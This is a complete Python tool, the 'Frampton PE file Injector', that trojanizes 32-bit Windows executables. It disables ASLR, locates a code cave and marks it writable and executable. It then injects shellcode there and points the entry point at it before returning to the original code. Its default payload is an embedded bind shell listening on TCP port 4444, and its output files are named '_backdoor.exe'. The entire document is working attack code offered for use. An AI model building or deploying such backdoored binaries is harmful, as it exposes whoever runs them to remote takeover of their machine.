#!/usr/bin/env python3

import sys
import os
import pefile
import argparse

parser = argparse.ArgumentParser(description='Frampton PE file Injector')
parser.add_argument('--file','-f',help='Filename or path to base template PE file',required=True,dest='file')
parser.add_argument('--shellcode','-s',help='Enter custom shellcode (optional) - Default: Windows x86 TCP 4444 Bind Shell',required=False,dest='shellcode',type=str)
parser.add_argument('--output','-o',help='Filename or path to new destination PE file (optional)',required=False,dest='outfile')

args = parser.parse_args()

# Load file to var
file = args.file

# Load to pefile object
pe = pefile.PE(file)

# Global var for ASLR tracking
aslr = False

def AslrStatus():

    global pe

    # ASLR Check
    dynamicBase = 0x40
    aslrcheck = pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040

    if aslrcheck:
        print ("[!] ASLR: \t\t\tEnabled - Disabling ASLR to " + newFile)
        pe.OPTIONAL_HEADER.DllCharacteristics &= ~dynamicBase
        pe.write(newFile)

        return True
        #sys.exit(1)
    else:
        print ("[+] ASLR: \t\t\tDisabled")
        return False

# Identifies code cave of specified size (min shellcode + 20 padding)
# Returns the Virtual and Raw addresses
def FindCave():

    global aslr
    global pe
    # # ASLR Check
    # dynamicBase = 0x40
    # aslrcheck = pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040
    #
    # if aslrcheck:
    #     print ("[!] ASLR: \t\t\tEnabled")
    #     pe.OPTIONAL_HEADER.DllCharacteristics &= ~dynamicBase
    #     #sys.exit(1)
    # else:
    #     print ("[+] ASLR: \t\t\tDisabled")

    aslr = AslrStatus()

    if aslr:
        filedata = open(newFile, "rb")
        pe = pefile.PE(newFile)
        #print ('0x{:08x}'.format(pe.OPTIONAL_HEADER.AddressOfEntryPoint))

    else:
        filedata = open(file, "rb")

    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)

    for section in pe.sections:
        sectionCount = 0
        if section.SizeOfRawData != 0:
            position = 0
            count = 0

            filedata.seek(section.PointerToRawData, 0)
            data = filedata.read(section.SizeOfRawData)

            for byte in data:
                position += 1

                if byte == 0x00:
                    count += 1
                else:

                    if count > minCave:
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base_hex + section.VirtualAddress + position - count - 1

                        print("[+] Code cave:")
                        print("\tSection: \t\t%s" % section.Name.decode())
                        print ("\tSize: \t\t\t%d bytes" % count)
                        print ("\tRaw: \t\t\t0x%08X" % raw_addr)
                        print ("\tVirtual: \t\t0x%08X" % vir_addr)
                        print("\tCharacteristics: \t" + hex(section.Characteristics))

                        # Set section header characteristics ## RWX
                        section.Characteristics = 0xE0000040
                        print("\tNew Characteristics: \t" + "0xE0000040")
                        return vir_addr,raw_addr

                    count = 0
        sectionCount += 1

    filedata.close()

# print ("msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=none -b '\x00' -f c")

# Uses default bind-shell (TCP 4444) if no shellcode input
shellcode = bytes(
    b"\xdb\xdb\xbb\xe6\x0e\x55\x48\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    b"\x53\x31\x5a\x17\x83\xea\xfc\x03\xbc\x1d\xb7\xbd\xbc\xca\xb5"
    b"\x3e\x3c\x0b\xda\xb7\xd9\x3a\xda\xac\xaa\x6d\xea\xa7\xfe\x81"
    b"\x81\xea\xea\x12\xe7\x22\x1d\x92\x42\x15\x10\x23\xfe\x65\x33"
    b"\xa7\xfd\xb9\x93\x96\xcd\xcf\xd2\xdf\x30\x3d\x86\x88\x3f\x90"
    b"\x36\xbc\x0a\x29\xbd\x8e\x9b\x29\x22\x46\x9d\x18\xf5\xdc\xc4"
    b"\xba\xf4\x31\x7d\xf3\xee\x56\xb8\x4d\x85\xad\x36\x4c\x4f\xfc"
    b"\xb7\xe3\xae\x30\x4a\xfd\xf7\xf7\xb5\x88\x01\x04\x4b\x8b\xd6"
    b"\x76\x97\x1e\xcc\xd1\x5c\xb8\x28\xe3\xb1\x5f\xbb\xef\x7e\x2b"
    b"\xe3\xf3\x81\xf8\x98\x08\x09\xff\x4e\x99\x49\x24\x4a\xc1\x0a"
    b"\x45\xcb\xaf\xfd\x7a\x0b\x10\xa1\xde\x40\xbd\xb6\x52\x0b\xaa"
    b"\x7b\x5f\xb3\x2a\x14\xe8\xc0\x18\xbb\x42\x4e\x11\x34\x4d\x89"
    b"\x56\x6f\x29\x05\xa9\x90\x4a\x0c\x6e\xc4\x1a\x26\x47\x65\xf1"
    b"\xb6\x68\xb0\x6c\xbe\xcf\x6b\x93\x43\xaf\xdb\x13\xeb\x58\x36"
    b"\x9c\xd4\x79\x39\x76\x7d\x11\xc4\x79\x90\xbe\x41\x9f\xf8\x2e"
    b"\x04\x37\x94\x8c\x73\x80\x03\xee\x51\xb8\xa3\xa7\xb3\x7f\xcc"
    b"\x37\x96\xd7\x5a\xbc\xf5\xe3\x7b\xc3\xd3\x43\xec\x54\xa9\x05"
    b"\x5f\xc4\xae\x0f\x37\x65\x3c\xd4\xc7\xe0\x5d\x43\x90\xa5\x90"
    b"\x9a\x74\x58\x8a\x34\x6a\xa1\x4a\x7e\x2e\x7e\xaf\x81\xaf\xf3"
    b"\x8b\xa5\xbf\xcd\x14\xe2\xeb\x81\x42\xbc\x45\x64\x3d\x0e\x3f"
    b"\x3e\x92\xd8\xd7\xc7\xd8\xda\xa1\xc7\x34\xad\x4d\x79\xe1\xe8"
    b"\x72\xb6\x65\xfd\x0b\xaa\x15\x02\xc6\x6e\x7f\x39\x0a\xcd\xe8"
    b"\x64\x5f\x53\x75\x97\x8a\x90\x80\x14\x3e\x69\x77\x04\x4b\x6c"
    b"\x33\x82\xa0\x1c\x2c\x67\xc6\xb3\x4d\xa2"
    )

nops = b"\x90\x90\x90\x90"

# Custom shellcode
if args.shellcode:
    shellcode = b"\x90\x90\x90\x90" + bytearray([int(x, 16) for x in args.shellcode.split("\\x") if len(x)])
else:
    shellcode = b"\x90\x90\x90\x90" + shellcode

if args.outfile:
    newFile = args.outfile
else:
    newFile = args.file.split(".exe")[0] + "_backdoor.exe"

print ("[i] Filename: \t\t\t" + os.path.basename(file))

# Checks if 32 or 64 bit binary
if hex(pe.FILE_HEADER.Machine) == '0x14c':
    print("[+] Arch: \t\t\t32-bit")
else:
    print("[!] Arch: \t\t\t64-bit")
    sys.exit(1)

# Find Code Cave
print("[i] Min Cave Size: \t\t" + str(4 + len(shellcode)) + " bytes")
minCave = len(shellcode) + 20
newEntryPoint,newRawOffset = FindCave()


# Stores original entrypoint
origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint)

# Stores Image Base (e.g. 0x400000)
image_base = pe.OPTIONAL_HEADER.ImageBase

# Stores entrypoint as 4 byte hex e.g. 0x0004777f)
entrypoint = '0x{:08x}'.format(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
print("[i] Entry Point:\t\t" + entrypoint)

# Sets new Entry Point
if aslr:
    aslr_ep = newEntryPoint - image_base
    #print (hex(aslr_ep))
    if (aslr_ep % 4 == 0):
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
    else:
        aslr_ep = (aslr_ep % 4) + aslr_ep
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep

else:
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = newRawOffset

print ("[i] New Entry Point:\t\t"  '0x{:08x}'.format(newRawOffset))

returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

# Add return address for original program execution
shellcode += (b"\xB8" + returnAddress + b"\xFF\xD0")

pe.set_bytes_at_offset(newRawOffset, shellcode)

print ("[+] New PE Saved:\t\t" + newFile)

pe.write(newFile)
pe.close()
